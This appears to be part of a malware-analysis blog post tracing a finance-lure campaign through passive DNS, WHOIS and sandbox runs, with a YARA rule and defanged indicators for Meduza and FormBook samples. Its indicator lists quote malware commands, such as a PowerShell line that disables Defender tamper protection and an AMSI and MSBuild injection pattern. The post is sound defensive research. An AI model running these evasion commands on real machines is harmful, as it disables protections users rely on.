+      The host is a known XWorm command and control on a cheap VPS network. ThreatFox had it on port <code>7004</code>, tied to a sample that is not mine. My binary hardcodes port <code>7766</code> on the same IP. Same operator infrastructure, a port that was not on anyone's list. That is the new, reportable piece, and it is the hinge the whole writeup turns on.
+    </p>
+
+    <h2>Pivoting in the dark with passive DNS</h2>
+    <p>
+      Censys came back with nothing on the C2 IP, which surprised exactly nobody once I thought about it. So I moved to passive DNS, which is the right tool for the question of what names have ever pointed at a host.
+    </p>
+
+    <div class="veggie">
+      <strong>Passive DNS, a time machine for names.</strong> Sensors scattered around the internet quietly log which domain names resolved to which IP addresses and when, then pool those observations. You can ask it forwards, what addresses did this name ever use, or backwards, what names ever pointed at this address. Live scanning only ever shows you this instant. Passive DNS shows you the history, which is how you catch infrastructure that moved last week.
+    </div>
+
+    <p>
+      I run these in Silent Push Community Edition. A quick word on the query language, since I corrected my own syntax partway through. It has no <code>OR</code> keyword. You express alternatives as a bracketed list inside one field, like <code>port = [7004, 7766]</code>, and you join different fields with <code>AND</code>. Every query is scoped to a data source. Passive DNS lives in <code>padns</code>, where an IP is matched on the <code>answer</code> field and a name on the <code>query</code> field. The brackets in the values below are defanging. Drop them to run.
+    </p>
+
+    <pre><code>answer = "104.207.74[.]198" AND datasource = padns</code></pre>
+    <pre><code>server.capitaledgey[.]online   104.207.74[.]198   A   first 2026-06-13   last 2026-06-29
+mail.capitaledgey[.]online     104.207.74[.]198   A   first 2026-06-15   last 2026-06-25</code></pre>
+
+    <p>
+      Exactly two names ever resolved to the staging box, both of them <code>capitaledgey[.]online</code> subdomains. No other lure domains sharing the host. That negative is a finding. It scopes the box tightly to this one campaign instead of revealing a stable of sibling lures, and the <code>server.</code> record was still resolving the day I wrote this, so the operation is live.
+    </p>
+
+    <pre><code>domain = "capitaledgey[.]online" AND datasource = whois</code></pre>
+    <pre><code>created     2026-06-12 20:44:28
+expires     2027-06-12 20:44:28
+registrar   NAMECHEAP INC
+nameserver  dns1.registrar-servers.com, dns2.registrar-servers.com
+email       (privacy masked)
+name/org    (privacy masked)</code></pre>
+
+    <p>
+      The registrant is hidden behind privacy, as a Namecheap dotonline almost always is, and the nameservers are Namecheap defaults that millions of domains share, so neither an email nor a nameserver pivot will single out this actor. The prize in that record is the date. Registered June 12, a one year term, updated the same minute. That is throwaway infrastructure stood up days before the binaries were built.
+    </p>
+
+    <p>
+      Then the pivot I most wanted, the one that might give the panel a name of its own.
+    </p>
+
+    <pre><code>answer = "38.240.51[.]74" AND datasource = padns
+  -> no results</code></pre>
+
+    <p>
+      Empty. No hostname ever pointed at the C2. And once again the empty box is the message. The operator hardcodes a bare IP and skips DNS entirely, which is why a name lookup finds nothing and why a web scanner that fingerprints certificates and banners also found nothing. The silence is a property of how this thing is built, not a gap in the search. A raw custom protocol on an odd port simply does not leave the kind of trail those tools are designed to read. The only place this C2 is written down in plaintext is inside the sample itself, which is the whole reason the payload had to be opened rather than found.
+    </p>
+
+    <h2>The timeline, which all lands in one week</h2>
+    <p>
+      Stack the dates and the operation tells its own story.
+    </p>
+
+    <pre><code>2026-06-12   capitaledgey[.]online registered (Namecheap, 1 year, privacy masked)
+2026-06-13   server.capitaledgey[.]online first resolves to 104.207.74[.]198
+2026-06-15   mail.capitaledgey[.]online first resolves (mail stack stood up)
+2026-06-22   38.240.51[.]74:7004 reported to ThreatFox as XWorm C2 (abuse_ch)
+   ~now      Built_Stub.exe hardcodes 38.240.51[.]74:7766, a new and unreported port
+             both sample hashes absent from every public feed (fresh builds)
+2026-06-29   server.capitaledgey[.]online still resolving, operation live</code></pre>
+
+    <p>
+      A seventeen day old domain, a mailbox stood up two days after registration, fresh binaries absent from every feed, and a C2 that surfaced on ThreatFox ten days after the domain was born. Everything points at a recent, active operation that was still breathing while I documented it. Letting both samples run the same day confirmed that breathing was not theoretical, the loader's C2 string fired a live connection the moment it got the chance.
+    </p>
+
+    <h2>Attribution, kept on a short leash</h2>
+    <p>
+      Here is what the evidence actually carries, and where it stops.
+    </p>
+
+    <p>
+      What I can stand behind is operator and infrastructure overlap with XWorm. The loader beacons to <code>38.240.51[.]74</code>, a host already flagged for an XWorm panel on port <code>7004</code>, and this sample extends that same host with a new port, <code>7766</code>, a connection now confirmed live by sandbox detonation rather than just sitting hardcoded and unused. Because the <code>7004</code> sample on file is not mine, the right phrase is shared operator infrastructure, not proof of a single hand. HYONIX is cheap hosting and a box like that can be rented by more than one tenant.
+    </p>
+
+    <p>
+      What I will not claim is that any of this is XWorm itself. The loader is Meduza, delivered by a Donut style in memory loader. The packed payload is FormBook. Neither one is the XWorm client. The only thread tying this operation to XWorm is the shared C2 panel on that host, and that is an infrastructure link, not a payload link. It is worth being precise about, because someone reading "XWorm C2" might reasonably assume an XWorm sample, and in this case the samples are two entirely different families pointed at, or sitting beside, XWorm associated infrastructure.
+    </p>
+
+    <p>
+      I will also own the guess I got wrong, since the whole point of this writeup is showing the work. Through the static phase I leaned toward the packed payload being an XWorm client, on the reasonable but unproven logic that a packed file next to an XWorm linked loader was probably more XWorm. Detonation said otherwise: Meduza in the loader, FormBook in the package. The lesson is the ordinary one, a guess that fits the available facts is still a guess until you run the thing, and dynamic analysis is what turns it into an answer.
+    </p>
+
+    <h2>The tracking signature</h2>
+    <p>
+      Throwaway infrastructure gets rebuilt the moment it burns, so the durable value is in the fingerprints that survive a redeploy. These are the ones to watch.
+    </p>
+
+    <pre><code>Stealer C2 (new, confirmed live):  38.240.51[.]74:7766
+Related XWorm C2:                  38.240.51[.]74:7004
+Loader family:                     Meduza Stealer (Donut in-memory loader)
+Packed payload family:             FormBook (aka XLoader)
+Staging cert SPKI:                 5f34e2100b3cce59adcc6a85a046f6ebb4c696cec3830d0464fc58d6de9e7534
+Loader mutex:                      MUTEX_W32
+FormBook drop mutex (one branch):  K620NR6-VEXECB0C
+FormBook injection target:         ftp.exe (SysWOW64, one branch)
+Injected DLL artifact:             inj_%u.dll
+FormBook drop path pattern:        C:\Program Files (x86)\&lt;random&gt;\&lt;random&gt;.exe
+Geofencing check:                  GET ip-api[.]com/line/?fields=countryCode
+Decoy error string:                "Optional update delivery is not working"
+Persistence masquerade:            WindowsUpdate.lnk
+Defender disable string:           Set-MpPreference -DisableTamperProtection $true
+Build marker:                      COMPILER=msvc-1944</code></pre>
+
+    <div class="veggie">
+      <strong>What a key fingerprint actually proves.</strong> A TLS certificate carries a public key, and that key has its own fingerprint called the SPKI hash. Two different servers presenting the same key fingerprint are almost never a coincidence. It usually means one operator copied the same key onto both, the way two houses opened by the same oddly cut key share a locksmith. So if that <code>5f34e2…</code> SPKI ever turns up on another host, that is a strong thread back to the same hands.
+    </div>
+
+    <p>
+      I also turned the loader's distinctive strings into a YARA rule so the next build trips a wire even if the hash changes. Refang the C2 string before you compile this.
+    </p>
+
+    <pre><code>import "pe"
+
+rule capitaledgey_loader_strings
+{
+    meta:
+        description = "Native C++ infostealer-loader: Defender-disable + AMSI patch + MSBuild injection"
+        author      = "ghostinthebit"
+        date        = "2026-06-29"
+    strings:
+        $defender = "Set-MpPreference -DisableTamperProtection $true" ascii wide
+        $excl     = "Add-MpPreference -ExclusionProcess" ascii wide
+        $amsi1    = "C:\\Windows\\System32\\Amsi.dll" ascii wide
+        $amsi2    = "C:\\Windows\\SysWow64\\Amsi.dll" ascii wide
+        $msb      = "Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" ascii wide
+        $injdll   = "inj_%u.dll" ascii wide
+        $mutex    = "MUTEX_W32" ascii wide
+        $geofence = "ip-api.com/line/?fields=countryCode" ascii wide
+        $decoy    = "Optional update delivery is not working" ascii wide
+        $c2       = "38.240.51[.]74:7766" ascii wide   /* refang before use */
+    condition:
+        uint16(0) == 0x5A4D and filesize > 500KB and filesize < 8MB and
+        pe.is_pe and not pe.imports("mscoree.dll") and
+        ( ($defender and $excl) or (1 of ($amsi*) and $msb and $injdll) or
+          ($geofence and $decoy) or $c2 )
+}
+
+/*
+    Runtime-only indicators, not statically matchable in bin.exe's bytes
+    (the payload is FormBook, encrypted until it unpacks in memory; these
+    artifacts appear only at runtime and vary by execution branch):
+
+        FormBook drop mutex     K620NR6-VEXECB0C
+        FormBook drop path      C:\Program Files (x86)\<random>\<random>.exe
+        FormBook injection      ftp.exe (SysWOW64) on the inject-instead-of-drop branch
+*/</code></pre>
+
+    <h2>What I am not claiming</h2>
+    <p>
+      <strong>On the families.</strong> None of this is XWorm itself. The loader is Meduza, the packed payload is FormBook. I am confident in those identifications because the unpacked code matched known signatures for each, not because a single tool guessed a label. What I am not claiming is any deeper tie between these two families and XWorm beyond the shared C2 panel they sit near. That panel is the only XWorm thread, and it is an infrastructure link, not a payload one.
+    </p>
+
+    <p>
+      <strong>On the guess I got wrong.</strong> I spent the static phase treating the packed payload as a probable XWorm client. That was a reasonable read of the available facts and it was still wrong. I am leaving the wrong turn visible in this writeup on purpose, because a clean post that pretends I knew it was FormBook all along would be teaching the wrong lesson. The right lesson is that static analysis narrows the field and dynamic analysis names the winner, and you do not get to skip the second step.
+    </p>
+
+    <p>
+      <strong>On the operator.</strong> I have no persona, no email, no wallet address. The WHOIS is privacy masked and the nameservers are shared defaults. This is infrastructure attribution, not people attribution, and I am not going to dress up a guess as more than that.
+    </p>
+
+    <p>
+      <strong>On certainty across sandboxes.</strong> The two payloads did not behave identically on every machine, and not every sandbox cracked them open the same way. The family identifications here are the ones that held up consistently across more than one environment, but I would not present any single detonation as the whole truth. More on that disagreement at the very end.
+    </p>
+
+    <p>
+      <strong>On what I chose not to pull.</strong> The two binaries were pulled off the live host on to a temporary cloud machine that was spun up for that one job, grabbed the files, and tore the server down once they were aquired, so there is nothing left sitting on infrastructure we do not control. What I did not do is go anywhere near the mail stack or any victim data, none was ever observed on the box to begin with. The infrastructure mapping itself stayed entirely passive, and the sandbox runs were the one place I deliberately let the C2 connection actually fire, a conscious tradeoff once the rest of the writeup was already heading toward publication anyway.
+    </p>
+
+    <h2>What to actually do about it</h2>
+    <p>
+      <strong>If you are defending a network.</strong> Block the C2 on <code>38.240.51[.]74:7766</code> and watch for the staging host <code>104.207.74[.]198</code>. Hunt the behavior rather than the hash, since the hash will rotate. The standout tells are a PowerShell command that disables Defender tamper protection, a process spawning <code>MSBuild.exe</code> with no build project in sight, and an <code>inj_%u.dll</code> dropped beside it. The mutex <code>MUTEX_W32</code> and the <code>WindowsUpdate.lnk</code> masquerade are cheap host based catches, and so is a non browser process making an outbound call to an IP geolocation API like <code>ip-api[.]com</code> right after launch. On the FormBook side, watch for the FTP client <code>ftp.exe</code> springing to life and behaving like a stealer, and for a brand new folder appearing under <code>Program Files (x86)</code> with a long randomly generated name. Push the samples to MalwareBazaar and report <code>38.240.51[.]74:7766</code> to ThreatFox, which puts the IOC in front of everyone else watching this operator. For takedown, the hosting provider's abuse contact on that host is <code>abuse@krixe.com</code>, worth a note since the box itself is rented, not operator owned.
+    </p>
+
+    <p>
+      <strong>If you are a regular person.</strong> This family arrives through a believable lure, a finance flavored email from a domain that looks close enough to real, sent off a working mail server built for exactly that. Once it runs it goes for the things that turn into money fast, your saved browser passwords, your live login cookies, and any crypto wallet on the machine. Two habits blunt most of it. Keep real value in a hardware wallet that an infostealer cannot scrape, and treat unexpected attachments and download links from finance themed mail as guilty until proven otherwise. If you think a machine is hit, get it off the network, have someone who knows what they are doing look at it, and change your passwords from a different device, because the cookies it already grabbed can outlive the password you just changed.
+    </p>
+
+    <h2>The honest wrap up</h2>
+    <p>
+      This one started as a file name on a misconfigured server and ended somewhere more interesting than I expected. A finance lure on a working mail box. A loader that turns off your alarm, hides inside a Microsoft tool, and phones a host carrying a known XWorm panel on a port nobody had reported. And a packed payload sitting right next to it. The tidy version of this story would have been "it is all XWorm," and the tidy version would have been wrong. The loader is Meduza, delivered Donut style straight into memory. The packed payload is FormBook. One operator, one staging box, one shared C2 host, and at least two different commodity families riding along.
+    </p>
+
+    <p>
+      The thread I will actually pull on next is the operator, not the malware. The families are named and the C2 is documented, but who is renting that HYONIX box and stitching Meduza, FormBook, and an XWorm panel together onto one finance lure is the open question worth chasing. Until then, the infrastructure is real, both samples are identified, and the fingerprints above will catch the next build when this operator spins one up. The empty search results carried as much weight as the full ones, no name on the C2, one campaign on the staging box, and a registration date that lands the whole thing inside a single week in June.
+    </p>
+
+    <div class="callout-note">
+      <strong>Sources and methodology.</strong> Open directory discovery and host profiling via Censys Platform. Passive DNS and WHOIS via Silent Push Community Edition. Reputation and prior reporting via VirusTotal and ThreatFox. The two samples were pulled from the open directory through a disposable cloud server built for that purpose and destroyed immediately after, never to my own machine or network. Static analysis then ran with a hand written PE parser plus standard string and hashing tools, no execution and no network during that phase. Both samples were later detonated in several automated and interactive sandbox services to confirm the C2 connection, identify the payloads, and observe runtime behavior, a deliberate step taken once the rest of the findings were already heading toward public submission. All network indicators are defanged. The mail stack and any victim data were never touched, none was ever observed on the host.
+    </div>
+
+    <h2>Indicators</h2>
+
+    <div class="ioc-block">
+      <h4>Hosts and C2</h4>
+      <pre><code>104.207.74[.]198      AS22612 Namecheap     staging host, cPanel/WHM + mail, open dir   LIVE
+capitaledgey[.]online (server., mail.)       finance lure domain                        LIVE
+38.240.51[.]74:7766   AS931/AS213122 HYONIX  stealer C2 (new, unreported port)
+38.240.51[.]74:7004   AS931/AS213122 HYONIX  related XWorm C2 (ThreatFox, abuse_ch)
+                      ASN differs by source: AS931 per Censys, AS213122 per ThreatFox
+dns1.registrar-servers.com / dns2.registrar-servers.com   Namecheap default nameservers</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Samples</h4>
+      <pre><code>6cd0e8316913a3fd7aed556811b5ab00bf9ea5271abee16152b577002256113f
+  Built_Stub.exe  native x64 loader/stealer (MSVC 19.44, unsigned)
+  Family: Meduza Stealer, delivered via Donut-style in-memory loader
+  MD5  b101e26ffbc726c750eb2e517d08e3aa
+  SHA1 4a47ddfc25a587cfb1ad9acca0092c0e12d860b0
+  Confirmed live: TCP to 38.240.51[.]74:7766, geofencing call to ip-api[.]com
+
+e3cf3fa76253ae8ecbd18344659be1d1bddde9469f99bb00e8c8295db2d338fb
+  bin.exe  packed payload (entropy 7.99, no imports)
+  Family: FormBook (aka XLoader), confirmed on unpack
+  MD5  40a8dee1f6886af16926fdf8c001e2c4
+  SHA1 d1370cc390d4b75370f55e633c0d981a41de30a8
+  Behavior: drops to Program Files (x86)\<random> OR injects into ftp.exe
+
+4412319ef944ebcca9581cbacb1d4e1dc614c348d1dfc5d2faaaad863d300209
+  Harvested-data store written by the FormBook stage (SQLite DB, not an executable)
+  MD5  a45465cdcdc6cb30c8906f3da4ec114c</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Host artifacts and fingerprints</h4>
+      <pre><code>Staging cert SPKI sha256   5f34e2100b3cce59adcc6a85a046f6ebb4c696cec3830d0464fc58d6de9e7534
+Loader mutex               MUTEX_W32
+FormBook drop mutex        K620NR6-VEXECB0C  (drop branch)
+FormBook injection target  ftp.exe (SysWOW64)  (inject branch)
+Injected DLL               inj_%u.dll
+FormBook drop path         C:\Program Files (x86)\<random>\<random>.exe
+Geofencing check           GET ip-api[.]com/line/?fields=countryCode
+Decoy error string         "Optional update delivery is not working"
+Persistence masquerade     WindowsUpdate.lnk
+Defender disable           Set-MpPreference -DisableTamperProtection $true
+LOLBIN injection target    MSBuild.exe (Framework and Framework64 v4.0.30319)
+Build marker               COMPILER=msvc-1944
+Compile timestamp          2026-04-03T13:37:08</code></pre>
+    </div>
+
+    <h2>A note on sandboxes, and why they disagreed</h2>
+    <p>
+      I want to be honest about how the family identifications above actually came together, because it was messier than a clean report usually lets on. I ran both samples through more than one dynamic analysis service, a mix of fully automated sandboxes and one interactive environment where I could drive the machine myself. They did not all agree, and they did not all succeed.
+    </p>
+
+    <p>
+      Some runs detonated the payload cleanly and named it. Others watched the same sample sit nearly inert, or unpack only in memory and bail, or take a completely different branch, dropping a fresh file on one machine and injecting into a trusted Windows process on another. That spread is not a flaw in any one tool, it is the malware doing its job: both of these families check their surroundings and behave differently depending on what they see, which is exactly why a single detonation is never the whole story. The identifications I have committed to here, Meduza in the loader and FormBook in the packed payload, are the ones that held up consistently across more than one independent environment rather than appearing in a single run. Where the runs disagreed on details, I have said so in the text rather than smoothing it over. If you reproduce this, expect your own results to vary by environment, and treat any single sandbox verdict as one data point, not a verdict.
+    </p>
+
+    <div class="newsletter-cta inline">
+      <h2 class="newsletter-cta-heading">Liked this?</h2>
+      <p class="newsletter-cta-sub">
+        I write one of these a month. Drop your email below to get new posts
+        and research in your inbox. No spam.
+      </p>
+      <form
+        action="https://buttondown.com/api/emails/embed subscribe/ghostinthebit"
+        method="post"
+        class="embeddable-buttondown-form"
+        target="popupwindow"
+      >
+        <label for="bd-email">Enter your email</label>
+        <input type="email" name="email" id="bd-email" placeholder="your@email.com" required />
+        <input type="submit" value="Subscribe" />
+        <p>
+          <a href="https://buttondown.com/refer/ghostinthebit" target="_blank" rel="noopener">
+            Powered by Buttondown.
+          </a>
+        </p>
+      </form>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <p><span id="footer-year"></span> · Ghost in the Bit</p>
+  </footer>
+  <script type="module">
+    import { renderSiteNav } from "/platform/lib/site-nav.js";
+    renderSiteNav(document.getElementById("site-nav-inline"), "blog");
+    document.getElementById("footer-year").textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
